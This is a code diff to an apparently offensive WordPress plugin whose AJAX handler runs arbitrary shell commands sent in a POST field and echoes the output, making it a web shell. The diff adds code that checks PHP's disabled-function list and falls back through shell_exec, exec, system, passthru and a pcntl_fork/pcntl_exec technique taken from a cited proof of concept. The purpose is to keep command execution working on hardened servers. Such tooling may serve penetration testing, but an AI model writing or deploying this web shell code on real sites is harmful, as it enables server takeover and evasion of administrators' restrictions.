@@ -79,6 +79,34 @@ function rswp_reverse_page() {
 
 add_action('wp_ajax_rswp_web_exec', 'rswp_handle_web_exec');
 
+function rswp_get_available_exec_function() {
+    $functions = [
+        'shell_exec',
+        'exec',
+        'system',
+        'passthru',
+        'pcntl_exec',
+        'pcntl_fork'
+    ];
+
+    $disabled = array_map(
+        'trim',
+        explode(',', (string) ini_get('disable_functions'))
+    );
+
+    foreach ($functions as $function) {
+        if (
+            function_exists($function) &&
+            !in_array($function, $disabled, true)
+        ) {
+            return $function;
+        }
+    }
+
+    return false;
+}
+
+
 function rswp_handle_web_exec() {
     check_ajax_referer('rswp_web_nonce', 'security');
 
@@ -87,7 +115,68 @@ function rswp_handle_web_exec() {
     }
 
     $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
-    $output = shell_exec($cmd . " 2>&1"); 
+    $output = "";
+
+    $exec_function = rswp_get_available_exec_function();
+
+    if (!$exec_function) {
+        wp_die('No permitted command execution function is available on this server.');
+    }
+
+    // poc https://medium.com/@soman07/php-rce-in-a-restricted-environment-using-pcntl-fork-and-pcntl-exec-50e07ef54168
+    if($exec_function == "pcntl_exec" || $exec_function == "pcntl_fork") {
+        $tmpFile = sys_get_temp_dir() . '/cmd_output.txt';
+        if ((function_exists('pcntl_fork') && function_exists('pcntl_exec'))) {
+            $pid = pcntl_fork();
+            if ($pid == -1) {
+                wp_die('Fork failed.');
+            } elseif ($pid === 0) {
+                pcntl_exec('/bin/sh', ['-c', $cmd . " > $tmpFile 2>&1"]);
+                exit(1);
+            } else {
+                pcntl_wait($status);
+                if (file_exists($tmpFile)) {
+                    $output = file_get_contents($tmpFile);
+                    unlink($tmpFile);
+                } else {
+                    wp_die('No output.');
+                }
+            }
+        } else {
+            wp_die('No permitted command execution function is available on this server.');
+        } 
+    }
+
+    if($output == "") {
+        switch ($exec_function) {
+            case 'shell_exec':
+                $output = shell_exec($cmd . ' 2>&1');
+                break;
+
+            case 'exec':
+                $lines = [];
+                $return_code = 0;
+
+                exec($cmd . ' 2>&1', $lines, $return_code);
+                $output = implode("\n", $lines);
+                break;
+
+            case 'system':
+                ob_start();
+                system($cmd . ' 2>&1', $return_code);
+                $output = ob_get_clean();
+                break;
+
+            case 'passthru':
+                ob_start();
+                passthru($cmd . ' 2>&1', $return_code);
+                $output = ob_get_clean();
+                break;
+
+            default:
+                wp_die('Unsupported execution method.');
+        }
+    }
 
     echo htmlspecialchars($output);
     wp_die();
